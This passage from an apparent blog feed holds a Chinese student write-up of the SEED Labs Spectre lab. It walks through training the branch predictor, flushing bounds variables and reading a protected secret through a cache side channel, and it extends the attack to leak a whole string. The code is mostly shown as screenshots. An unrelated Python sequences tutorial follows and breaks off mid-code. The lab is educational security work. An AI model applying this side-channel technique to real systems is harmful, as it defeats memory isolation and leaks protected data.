Execution</h2><p>Spectre 攻击依赖于大多数 CPU的一项重要功能。为了理解这一特性，让我们看看下面的代码。这段代码检查 x是否小于 size，如果是，变量数据将被更新。假设 size 的值是 10，那么如果 x等于 15，第 3 行的代码将不会被执行。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018500.png"alt="image-20231206100310206" /><figcaption aria-hidden="true">image-20231206100310206</figcaption></figure><p>从 CPU 外部看，上述关于代码示例的说法是正确的。但是，如果我们进入CPU，在微体系结构层面查看执行顺序，就不完全正确了。如果这样做，我们就会发现，即使x 的值大于 size，第 3 行也可能被成功执行。这是因为现代 CPU采用了一种重要的优化技术。这就是所谓的失序执行。</p><p>乱序执行是一种优化技术，可使中央处理器最大限度地利用其所有执行单元。CPU不严格按照顺序处理指令，而是在所有所需资源可用时立即并行执行指令。当当前操作的执行单元被占用时，其他执行单元可以提前运行。</p><p>在上面的代码示例中，在微体系结构层面，第 2行涉及两个操作：从内存中加载 size 值，以及将该值与 x 进行比较。现代 CPU不会闲置，而是尝试预测比较结果，并根据估计结果推测性地执行分支。由于这种执行在比较完成之前就已开始，因此称为乱序执行。在执行失序执行之前，CPU会存储其当前状态和寄存器的值。当大小值最终到达时，CPU将检查实际结果。如果预测结果为真，则会提交推测执行的执行结果，从而显著提高性能。如果预测是错误的，CPU将恢复到保存状态，因此所有超序执行产生的结果都将被丢弃，就像从未发生过一样。图3 展示了示例代码第 2 行导致的乱序执行。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018501.png"alt="image-20231206100355344" /><figcaption aria-hidden="true">image-20231206100355344</figcaption></figure><p>英特尔和一些 CPU制造商在设计失序执行时犯了一个严重的错误。他们抹去了不应该发生的乱序执行对寄存器和内存的影响，因此乱序执行不会导致任何可见的影响。但是，他们忘了一件事，那就是对CPU缓存的影响。在乱序执行过程中，被引用的内存会被提取到寄存器中，同时也会被存储到缓存中。如果必须丢弃失序执行的结果，那么由执行引起的缓存也应该被丢弃。遗憾的是，大多数CPU 并非如此，因此会产生可观察到的影响。利用任务 1 和 2中描述的侧信道技术，我们可以观察到这种效果。Spectre攻击巧妙地利用了这种可观测效应来找出受保护的秘密值。</p><h2 id="the-experiment">4.2 The Experiment</h2><p>在这项任务中，我们通过实验来观察乱序执行所造成的影响。本实验使用的代码如下所示。代码中使用的一些函数与前面任务中的函数相同，因此不再赘述。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018502.png"alt="image-20231206100442077" /><figcaption aria-hidden="true">image-20231206100442077</figcaption></figure><p>CPU 要执行推测执行，就必须能够预测 if 条件的结果。CPU会记录过去执行的分支，然后利用这些过去的结果来预测推测执行中应执行的分支。因此，如果我们希望在推测执行中使用某个分支，就应该对CPU 进行训练，这样我们选择的分支就能成为预测结果。训练在从第➂行开始的for 循环中进行。在循环内部，我们调用 victim()，参数很小（从 0 到9）。这些值小于值大小，因此第 ➀ 行中 if条件的真分支总是被取用。这是训练阶段，本质上是训练 CPU 使其预期 if条件为真。</p><p>一旦 CPU 经过训练，我们就会向 victim()函数（第➄行）传递一个较大的值（97）。这个值比 size大，因此在实际执行时，将取用 victim() 内部 if条件的假分支，而不是真分支。不过，我们已经从内存中刷新了变量size，因此从内存中获取其值可能需要一些时间。此时 CPU将做出预测，并开始执行乱序执行。</p><h2 id="task3">4.3 Task3</h2><p>请编译清单 3 中所示的 SpectreExperiment.c 程序（编译指令参见第 2节）；运行程序并描述您的观察结果。由于 CPU缓存的额外内容，侧信道中可能会有一些噪音，我们稍后会减少噪音，但现在您可以多次执行任务以观察效果。请观察向victim() 输入 97 时，是否执行了第 ➁ 行。还请执行以下操作：</p><ul><li>注释掉标有✰的行，然后重新执行。解释你的观察结果。</li><li>将第➃行替换为 victim(i+20)；再次运行代码并解释你的观察结果。</li></ul><p><strong>实验流程：</strong></p><ol type="1"><li><p>修改CACHE_HIT_THRESHOLD为100，编译并多次运行代码。结果：虽然97大于size，但均执行了<code>temp = array[97 * 4096 + DELTA];</code>,说明CPU进行了分支预测和乱序执行。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018503.png"alt="image-20231206100620653" /><figcaption aria-hidden="true">image-20231206100620653</figcaption></figure></li><li><p>注释<code>_mm_clflush(&amp;size);</code>，重新编译并多次运行代码。结果：如果没有将size从CPU缓存中清除，那么可以快速获得size的值，并进行比较，得到if是否为真，就不会导致CPU乱序执行。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018504.png"alt="image-20231206100640366" /><figcaption aria-hidden="true">image-20231206100640366</figcaption></figure></li><li><p>修改<code>victim(i);</code>为<code>victim(i+20)</code>，重新编译并多次运行代码。结果：没有执行if中的语句，因为修改后，CPU被训练为不执行该分支。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018505.png"alt="image-20231206100700830" /><figcaption aria-hidden="true">image-20231206100700830</figcaption></figure></li></ol><h1 id="task-4-the-spectre-attack">5. Task 4: The Spectre Attack</h1><p>正如我们从前面的任务中看到的，我们可以让 CPU 执行 if语句的真分支，即使条件为假。如果这种乱序执行不会造成任何可见的影响，那就不是问题。但是，大多数具有此功能的CPU 不会清理缓存，因此会留下一些乱序执行的痕迹。Spectre攻击会利用这些痕迹窃取受保护的机密。</p><p>这些秘密可以是另一个进程中的数据，也可以是同一进程中的数据。如果秘密数据在另一个进程中，硬件层面的进程隔离可以防止一个进程从另一个进程中窃取数据。如果数据在同一进程中，则通常通过软件（如沙箱机制）进行保护。Spectre攻击可以针对这两种类型的秘密。不过，从另一个进程中窃取数据要比从同一进程中窃取数据难得多。为简单起见，本实验室只关注从同一进程中窃取数据。</p><p>在浏览器中打开来自不同服务器的网页时，它们通常是在同一进程中打开的。浏览器内的沙盒将为这些网页提供一个隔离的环境，因此一个网页将无法访问另一个网页的数据。大多数软件保护都依靠条件检查来决定是否允许访问。利用Spectre 攻击，即使条件检查失败，我们也能让 CPU执行（不按顺序）受保护的代码分支，从根本上击败访问检查。</p><h2 id="the-setup-for-the-experiment">5.1 The Setup for theExperiment</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018506.png"alt="image-20231206100759562" /><figcaption aria-hidden="true">image-20231206100759562</figcaption></figure><p>图 4展示了实验设置。在此设置中，有两种类型的区域：受限区域和非受限区域。限制是通过下面描述的沙盒函数中的if 条件实现的。对于用户提供的 x 值，只有当 x位于缓冲区的下限和上限之间时，沙盒函数才会返回缓冲区[x]的值。因此，该沙箱函数永远不会向用户返回限制区域内的任何内容。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018507.png"alt="image-20231206100813085" /><figcaption aria-hidden="true">image-20231206100813085</figcaption></figure><p>受限区域（缓冲区上方或下方）有一个秘密值，攻击者知道该秘密值的地址，但攻击者无法直接访问保存秘密值的内存。访问秘密的唯一途径是通过上述沙盒函数。从上一节中，我们了解到虽然在x 大于缓冲区大小的情况下，true-branch永远不会被执行，但在微体系结构层面，它可以被执行，并且在执行还原时会留下一些痕迹。</p><h2 id="the-program-used-in-the-experiment">5.2 The Program Used in theExperiment</h2><p>基本 Spectre 攻击的代码如下所示。在这段代码中，第 ➀行定义了一个秘密。假定我们不能直接访问秘密、下限值绑定变量或上限值绑定变量（我们假定可以从缓存中刷新这两个绑定变量）。我们的目标是使用Spectre攻击打印出秘密。下面的代码只窃取了秘密的第一个字节。学生们可以对其进行扩展，以打印出更多字节。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018508.png"alt="image-20231206100928634" /><figcaption aria-hidden="true">image-20231206100928634</figcaption></figure><p>大部分代码与清单 3中的代码相同，因此我们在此不再重复解释。最重要的部分在第➁、➂ 和➃行。第➃行计算从缓冲区开头算起的秘密偏移量（我们假设攻击者知道秘密的地址；在实际攻击中，攻击者有很多方法找出地址，包括猜测）。偏移量肯定超出了缓冲区的范围，因此它大于缓冲区的上限或小于下限（即负数）。偏移量将输入restrictedAccess() 函数。由于我们已经训练 CPU 在 restrictedAccess()中使用 true 分支，因此 CPU 将在非顺序执行中返回 buffer[indexbeyond]，其中包含秘密值。然后，秘密值会导致其在数组[]中的对应元素被加载到缓存中。所有这些步骤最终都会被还原，因此从外部看，restrictedAccess()只返回 0，而不是秘密值。但是，缓存并没有被清理，数组[s*4096 + DELTA]仍保留在缓存中。现在，我们只需使用侧信道技术找出数组[]中的哪个元素在缓存中。</p><p>任务。请编译并执行SpectreAttack.c。请描述您的观察结果，并指出您是否能够窃取秘密值。如果侧信道中存在大量噪音，您可能无法每次都得到一致的结果。为了克服这个问题，您应该多次执行程序，看看是否能获得秘密值。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>代码理解：这段代码是一个演示性的 Spectre 攻击示例。Spectre是一种侧信道攻击，利用了现代处理器的乱序执行特性，通过对缓存侧信道进行侦听，来泄露程序内部的秘密信息。代码流程：</p><ul><li>restrictedAccess() 函数通过检查输入的索引 x 是否在界限 bound_lower和 bound_upper 内，来访问 buffer 数组中的值。</li><li>flushSideChannel() 函数将 array数组中的特定元素加入内存，然后将这些元素从缓存中清除，以便之后侧信道攻击使用。</li><li>reloadSideChannel() 函数利用缓存侧信道，监测 array数组中哪些元素在缓存中。</li><li>spectreAttack() 函数尝试利用 Spectre攻击漏洞，以超出界限的索引来访问 buffer 数组，通过观察侧信道信息来泄露secret 的值。</li><li>在 main() 函数中：通过计算 secret 在 buffer中的偏移量，确定了一个超出界限的索引 index_beyond。调用 spectreAttack()尝试利用 Spectre 攻击来获取 secret 的值。最后，通过 reloadSideChannel()函数来检查侧信道攻击是否成功，看是否可以通过缓存侧信道泄露 secret的值。</li></ul></li><li><p>修改CACHE_HIT_THRESHOLD为100，编译并多次运行代码。结果：运行十余次，绝大多数情况下都能得到秘密值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018509.png"alt="image-20231206101142788" /><figcaption aria-hidden="true">image-20231206101142788</figcaption></figure></li></ol><h1 id="task-5-improve-the-attack-accuracy">6. Task 5: Improve theAttack Accuracy</h1><p>在前面的任务中，我们可能会发现结果中确实存在一些噪音，而且结果并不总是准确的。这是因为CPU有时会在缓存中加载额外的值，以备日后使用，或者阈值并不十分准确。缓存中的这些噪声会影响我们的攻击结果。我们需要多次执行攻击；与其手动操作，不如使用以下代码自动执行任务。</p><p>基本上，我们使用一种统计技术。其思想是创建一个大小为256的得分数组，每个可能的秘密值对应一个元素。然后我们多次进行攻击。每次，如果我们的攻击程序表示k是秘密（这个结果可能是错误的），我们就在scores[k]中加1。在多次运行攻击后，我们使用得分最高的k值作为我们对秘密的最终估计。这将产生比基于单次运行的估计更可靠的结果。修订后的代码如下所示。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018510.png"alt="image-20231206101222324" /><figcaption aria-hidden="true">image-20231206101222324</figcaption></figure><p>你的任务是编译并运行SpectreAttackImproved.c，并完成以下任务：</p><ul><li>你可能会观察到，当运行以上代码时，得分最高的很可能是scores[0]。请找出原因，并修复以上代码，以便打印出实际的秘密值（而不是零）。</li><li>第1行似乎是无用的，但根据我们在SEED Ubuntu20.04上的经验，没有这一行，攻击将无法成功。在SEED Ubuntu16.04虚拟机上，这一行是不需要的。我们尚未找出确切的原因，所以如果你能找出原因，你的指导老师可能会给予额外的奖励分数。请分别运行程序，有和没有这一行，并描述你的观察结果。</li><li>第2行导致程序休眠10微秒。程序休眠的时间确实会影响攻击的成功率。请尝试几个其他数值，并描述你的观察结果。</li></ul><p><strong>实验流程：</strong></p><ol type="1"><li><p>修改CACHE_HIT_THRESHOLD为100，编译并多次运行代码。结果：得到的秘密值都是0。原因分析：在这段代码中，s是从restrictedAccess(index_beyond)返回的值。然后，这个值被用作array数组的索引来进行内存访问和修改。然而restrictedAccess函数在index_beyond超出合法范围时返回的是0。因此，实际上会访问array[DELTA]，即array数组赋值过的第一个元素。这就导致了array[DELTA]被频繁访问和修改，因为所有restrictedAccess返回0的情况都会导致对array[DELTA]的访问。所以，在reloadSideChannelImproved中，访问时间短的地方很可能是array[DELTA]，即scores[0]。修复：直接将score[0]设置为0。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018511.png"alt="image-20231206101352912" /><figcaption aria-hidden="true">image-20231206101352912</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018512.png"alt="image-20231206101356891" /><figcaption aria-hidden="true">image-20231206101356891</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018513.png"alt="image-20231206101401722" /><figcaption aria-hidden="true">image-20231206101401722</figcaption></figure></li><li><p>重新编译运行代码，多次运行，均成功获取到秘密值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018514.png"alt="image-20231206101421613" /><figcaption aria-hidden="true">image-20231206101421613</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018515.png"alt="image-20231206101425500" /><figcaption aria-hidden="true">image-20231206101425500</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018516.png"alt="image-20231206101429359" /><figcaption aria-hidden="true">image-20231206101429359</figcaption></figure></li><li><p>注释<code>printf("*****\n");</code>，重新编译运行代码。结果：在20.04虚拟机中无法成功攻击。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018517.png"alt="image-20231206101445903" /><figcaption aria-hidden="true">image-20231206101445903</figcaption></figure></li><li><p>取消注释，修改睡眠时间为1微秒。重新编译并多次运行代码，每次都获取到秘密值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018519.png"alt="image-20231206101516681" /><figcaption aria-hidden="true">image-20231206101516681</figcaption></figure></li><li><p>修改睡眠时间为1000微秒，重新编译并多次运行代码，每次都获取到秘密值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018520.png"alt="image-20231206101538897" /><figcaption aria-hidden="true">image-20231206101538897</figcaption></figure></li><li><p>修改睡眠时间为100000微秒，重新编译并多次运行代码，没有获取到秘密值。原因分析：在Spectre攻击中，攻击者试图在预测执行期间访问敏感数据，然后通过测量访问所需的时间来推断这些数据的内容。当restrictedAccess函数返回0，攻击尝试访问array[0*4096 + DELTA]时，如果这个内存地址被缓存在 CPU的缓存中，那么访问速度将非常快。但是，如果在这之前有一段较长的空闲时间（比如usleep(100000)引入的100000微秒的休眠），可能会导致缓存被刷新或者替换，使得后续的攻击尝试无法从缓存中获得信息，从而降低攻击的成功率。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018521.png"alt="image-20231206101607174" /><figcaption aria-hidden="true">image-20231206101607174</figcaption></figure></li></ol><h1 id="task-6-steal-the-entire-secret-string">7. Task 6: Steal theEntire Secret String</h1><p>在前一项任务中，我们只读取了秘密字符串的第一个字符。在本任务中，我们需要使用Spectre 攻击打印出整个字符串。请编写自己的代码或扩展任务 5中的代码，并将执行结果写入报告。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>代码编写：基于Task5中的代码进行修改，主函数中增加一个for循环，从secret头指针开始偏移，对每一个字符发起幽灵攻击，最后就能得到完整的secret字符串。为方便查看，将得到的秘密字符写入文件。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018522.png"alt="image-20231206101722789" /><figcaption aria-hidden="true">image-20231206101722789</figcaption></figure></li><li><p>编译并运行代码，目标文件中成功写入秘密字符串。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018523.png"alt="image-20231206101735269" /><figcaption aria-hidden="true">image-20231206101735269</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312061018524.png"alt="image-20231206101705656" /><figcaption aria-hidden="true">image-20231206101705656</figcaption></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>System Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>序列</title>
    <link href="/2023/12/04/Python/%E5%9F%BA%E7%A1%80%E7%AF%87/%E5%BA%8F%E5%88%97/"/>
    <url>/2023/12/04/Python/%E5%9F%BA%E7%A1%80%E7%AF%87/%E5%BA%8F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<h1 id="序列">1. 序列</h1><p>在 Python中，序列是指包含一系列元素的数据结构。Python内置的五个常用序列结构：列表、元组、集合、字典、字符串。</p><h2 id="索引">1.1 索引</h2><p>在 Python中，序列（比如列表、元组、字符串等）中的元素可以通过索引访问。索引用于定位序列中特定位置的元素，索引值从0 开始。</p><h3 id="正向索引">1.1.1 正向索引</h3><p>正向索引从序列的开头（左侧）开始，使用整数值从 <code>0</code>开始递增来访问元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>]<br><span class="hljs-built_in">print</span>(my_list[<span class="hljs-number">0</span>])  <span class="hljs-comment"># 输出：10（索引0对应的元素）</span><br><span class="hljs-built_in">print</span>(my_list[<span class="hljs-number">2</span>])  <span class="hljs-comment"># 输出：30（索引2对应的元素）</span><br></code></pre></td></tr></table></figure><h3 id="反向索引">1.1.2 反向索引</h3><p>反向索引从序列的末尾（右侧）开始，使用负整数值从 <code>-1</code>开始递减来访问元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_tuple = (<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>)<br><span class="hljs-built_in">print</span>(my_tuple[-<span class="hljs-number">1</span>])  <span class="hljs-comment"># 输出：&#x27;e&#x27;（索引-1对应的元素，即最后一个元素）</span><br><span class="hljs-built_in">print</span>(my_tuple[-<span class="hljs-number">3</span>])  <span class="hljs-comment"># 输出：&#x27;c&#x27;（索引-3对应的元素）</span><br></code></pre></td></tr></table></figure><h2 id="切片操作">1.2 切片操作</h2><p>切片操作允许你获取序列中的一部分。使用 <code>[start:stop:step]</code>的语法来执行切片操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_string = <span class="hljs-string">&quot;Hello, World!&quot;</span><br><span class="hljs-built_in">print</span>(my_string[<span class="hljs-number">7</span>:])  <span class="hljs-comment"># 输出：&quot;World!&quot;（从索引7开始到末尾的所有元素）</span><br><span class="hljs-built_in">print</span>(my_string[:<span class="hljs-number">5</span>])  <span class="hljs-comment"># 输出：&quot;Hello&quot;（从开头到索引5之前的所有元素）</span><br><span class="hljs-built_in">print</span>(my_string[::<span class="hljs-number">2</span>])  <span class="hljs-comment"># 输出：&quot;Hlo ol!&quot;（每隔一个元素进行切片）</span><br></code></pre></td></tr></table></figure><h2 id="序列相加">1.3 序列相加</h2><p>在 Python 中，可以使用 <code>+</code>运算符将两个序列（比如列表、元组、字符串等）进行相加，从而生成一个新的序列，新序列包含了两个序列的所有元素。</p><p><strong>列表相加</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">list1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>list2 = [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]<br>result_list = list1 + list2<br><span class="hljs-built_in">print</span>(result_list)  <span class="hljs-comment"># 输出：[1, 2, 3, 4, 5, 6]</span><br></code></pre></td></tr></table></figure><p><strong>字符串相加</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">str1 = <span class="hljs-string">&quot;Hello, &quot;</span><br>str2 = <span class="hljs-string">&quot;world!&quot;</span><br>result_str = str1 + str2<br><span class="hljs-built_in">print</span>(result_str)  <span class="hljs-comment"># 输出：&quot;Hello, world!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>元组相加</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">tuple1 = (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>tuple2 = (<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)<br>result_tuple = tuple1 + tuple2<br><span class="hljs-built_in">print</span>(result_tuple)  <span class="hljs-comment"># 输出：(1, 2, 3, 4)</span><br></code></pre></td></tr></table></figure><h2 id="序列相乘">1.4 序列相乘</h2><p>在 Python 中，可以使用乘法运算符 <code>*</code>来对序列进行乘法操作。对序列乘以一个整数会产生一个新的序列，其中原始序列中的元素被重复指定的次数。</p><p><strong>列表相乘：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">list1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>result_list = list1 * <span class="hljs-number">3</span><br><span class="hljs-built_in">print</span>(result_list)  <span class="hljs-comment"># 输出：[1, 2, 3, 1, 2, 3, 1, 2, 3]</span><br></code></pre></td></tr></table></figure><p><strong>字符串相乘：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">str1 = <span class="hljs-string">&quot;Hello, &quot;</span><br>result_str = str1 * <span class="hljs-number">3</span><br><span class="hljs-built_in">print</span>(result_str)  <span class="hljs-comment"># 输出：&quot;Hello, Hello, Hello, &quot;</span><br></code></pre></td></tr></table></figure><p><strong>元组相乘：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">tuple1 = (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>result_tuple = tuple1 * <span class="hljs-number">4</span><br><span class="hljs-built_in">print</span>(result_tuple)  <span class="hljs-comment"># 输出：(1, 2, 1, 2, 1, 2, 1, 2)</span><br></code></pre></td></tr></table></figure><h2 id="检查某个元素是否是序列的成员">1.5检查某个元素是否是序列的成员</h2><p>在 Python 中，你可以使用关键字 <code>in</code>来检查某个元素是否是序列（比如列表、元组、字符串等）的成员。</p><p><strong>示例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>element = <span class="hljs-number">3</span><br><br><span class="hljs-keyword">if</span> element <span class="hljs-keyword">in</span> my_list:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;element&#125;</span> 是列表的成员&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;element&#125;</span> 不是列表的成员&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="列表">2. 列表</h1><p>Python 中的列表是一种数据结构，用于存储多个元素。列表使用方括号<code>[]</code>表示，可以包含任何类型的元素，甚至可以是不同类型的混合。</p><h2 id="列表的创建和删除">2.1 列表的创建和删除</h2><p>在 Python中创建列表非常简单，你可以直接在方括号内添加元素来定义列表。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pythonCopy codemy_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]  <span class="hljs-comment"># 包含整数的列表</span><br>mixed_list = [<span class="hljs-number">1</span>, <span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-number">3.14</span>, <span class="hljs-literal">True</span>]  <span class="hljs-comment"># 包含不同类型的元素</span><br>empty_list = []  <span class="hljs-comment"># 创建一个空列表</span><br></code></pre></td></tr></table></figure><p>要删除列表，可以使用 <code>del</code>关键字来删除整个列表变量。比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]  <span class="hljs-comment"># 创建一个列表</span><br><span class="hljs-keyword">del</span> my_list  <span class="hljs-comment"># 删除这个列表</span><br><span class="hljs-comment"># 现在尝试访问my_list将会引发 NameError，因为它已经被删除了</span><br></code></pre></td></tr></table></figure><p>此外，你也可以使用 <code>clear()</code>方法来清空列表中的所有元素，但是保留列表本身。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]  <span class="hljs-comment"># 创建一个列表</span><br>my_list.clear()  <span class="hljs-comment"># 清空列表</span><br><span class="hljs-built_in">print</span>(my_list)  <span class="hljs-comment"># 输出：[]</span><br></code></pre></td></tr></table></figure><h2 id="访问列表元素">2.2 访问列表元素</h2><p>要访问列表中的元素，你可以使用索引来获取特定位置的元素。Python中的列表使用从 0 开始的索引，这意味着第一个元素的索引是0，第二个元素的索引是 1，依此类推。示例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pythonCopy</span> codemy_list =<span class="hljs-meta"> [10, 20, 30, 40, 50]</span><br><br><span class="hljs-attribute">print</span>(my_list[<span class="hljs-number">0</span>])  # 输出：<span class="hljs-number">10</span><br><span class="hljs-attribute">print</span>(my_list[<span class="hljs-number">2</span>])  # 输出：<span class="hljs-number">30</span><br><span class="hljs-attribute">print</span>(my_list[-<span class="hljs-number">1</span>])  # 输出：<span class="hljs-number">50</span><br></code></pre></td></tr></table></figure><h2 id="遍历列表">2.3 遍历列表</h2><p>遍历列表意味着逐个访问列表中的每个元素。在 Python中，你可以使用循环来遍历列表。有几种方法可以做到这一点：</p><ol type="1"><li><strong>使用 for 循环：</strong>这是遍历列表最常见的方法，你可以通过 <code>for</code>循环来遍历列表中的每个元素。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>]<br><br><span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> my_list:<br>    <span class="hljs-built_in">print</span>(element)<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li><strong>使用索引和 range 函数：</strong>有时你可能需要访问列表中元素的索引。可以使用 <code>range()</code>函数和列表的长度来获取索引并访问元素。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(my_list)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Index:&quot;</span>, i, <span class="hljs-string">&quot;Element:&quot;</span>, my_list[i])<br></code></pre></td></tr></table></figure><p>这样做可以访问元素以及它们的索引。</p><ol start="3" type="1"><li><strong>同时获取索引和元素：</strong> 使用 <code>enumerate()</code>函数可以在循环中同时获取元素和它们的索引。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span 